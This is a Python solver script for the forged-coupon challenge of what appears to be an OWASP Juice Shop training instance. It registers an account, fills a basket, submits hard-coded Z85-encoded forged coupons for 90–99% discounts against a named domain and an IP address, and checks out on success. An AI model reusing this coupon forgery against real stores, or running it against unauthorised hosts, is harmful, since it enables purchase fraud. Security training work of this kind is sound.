#!/usr/bin/env python3

import requests
import time

def test_final_coupon(base_url, server_name):
    print(f"\n🎯 FINAL TEST: {server_name}")
    
    session = requests.Session()
    email = f"solver{int(time.time())}@test.com"
    password = "Test123!"
    
    # Setup with detailed logging
    print("   1. Registering user...")
    reg_resp = session.post(f"{base_url}/api/Users/", json={
        "email": email, "password": password, "passwordRepeat": password,
        "securityQuestion": {"id": 1, "question": "test"}, "securityAnswer": "test"
    })
    print(f"      Registration: {reg_resp.status_code}")
    
    print("   2. Logging in...")
    login_resp = session.post(f"{base_url}/rest/user/login", json={
        "email": email, "password": password
    })
    
    if login_resp.status_code == 200:
        token = login_resp.json()['authentication']['token']
        session.headers['Authorization'] = f'Bearer {token}'
        print(f"      Login: ✅ Success")
        
        print("   3. Adding products to basket...")
        products = session.get(f"{base_url}/rest/products/search").json()['data']
        
        # Add a higher-value product to make discount more meaningful
        expensive_product = max(products, key=lambda p: p['price'])
        add_resp = session.post(f"{base_url}/api/BasketItems/", json={
            "ProductId": expensive_product['id'], "quantity": 2
        })
        print(f"      Added product: {expensive_product['name']} (${expensive_product['price']})")
        
        print("   4. Getting basket info...")
        user_data = session.get(f"{base_url}/rest/user/whoami").json()['user']
        basket_id = user_data.get('bid', 1)
        
        # Verify basket has content
        basket_resp = session.get(f"{base_url}/rest/basket/{basket_id}")
        if basket_resp.status_code == 200:
            basket_data = basket_resp.json()['data']
            print(f"      Basket ID: {basket_id}, Products: {len(basket_data.get('Products', []))}")
        
        print("   5. Testing Z85 coupon...")
        
        # Test the properly formatted current date coupon
        z85_coupon = "h7Z*xpEw8p"  # OCT25-90
        
        print(f"      Coupon: {z85_coupon} (OCT25-90 = 90% discount)")
        
        coupon_resp = session.put(f"{base_url}/rest/basket/{basket_id}/coupon/{z85_coupon}", json={})
        print(f"      Status: {coupon_resp.status_code}")
        
        if coupon_resp.status_code == 200:
            result = coupon_resp.json()
            discount = result.get('discount', 0)
            
            print(f"      🎉 SUCCESS! Discount: {discount}%")
            
            if discount >= 80:
                print(f"      🏆 CHALLENGE SOLVED on {server_name}!")
                
                # Complete by checking out
                checkout_resp = session.post(f"{base_url}/rest/basket/{basket_id}/checkout", json={})
                print(f"      Checkout: {checkout_resp.status_code}")
                
                return True
        else:
            print(f"      Response: {coupon_resp.text}")
            
            # Try alternative current month coupons
            alt_coupons = [
                ("h7Z*xpEw8p", "OCT25-90"),  # October 2025, 90%
                ("h7Z*Gl}6D#", "DEC25-99"),  # December 2025, 99%
                ("pEw8ogC7ss", "OCT13-15"),  # From backup - test if old codes work
            ]
            
            print(f"      Trying {len(alt_coupons)} alternative coupons...")
            for coupon_code, description in alt_coupons:
                alt_resp = session.put(f"{base_url}/rest/basket/{basket_id}/coupon/{coupon_code}", json={})
                
                if alt_resp.status_code == 200:
                    alt_result = alt_resp.json()
                    alt_discount = alt_result.get('discount', 0)
                    
                    if alt_discount >= 80:
                        print(f"      🎉 ALTERNATIVE SUCCESS! {coupon_code} ({description}) = {alt_discount}%")
                        return True
                    elif alt_discount > 0:
                        print(f"      ✅ {coupon_code}: {alt_discount}% (insufficient)")
    
    return False

# Test both servers
success = False
if test_final_coupon("https://juice5.wonkatech.org", "Cloudflare"):
    success = True
elif test_final_coupon("http://66.42.93.220", "Direct Server"):
    success = True

if not success:
    print("\n🔧 Troubleshooting suggestions:")
    print("1. Coupons might be disabled in application configuration")
    print("2. May need to solve prerequisite challenges first")
    print("3. Try different month/year combinations")
    print("4. Check if checkout process is required to activate coupons")
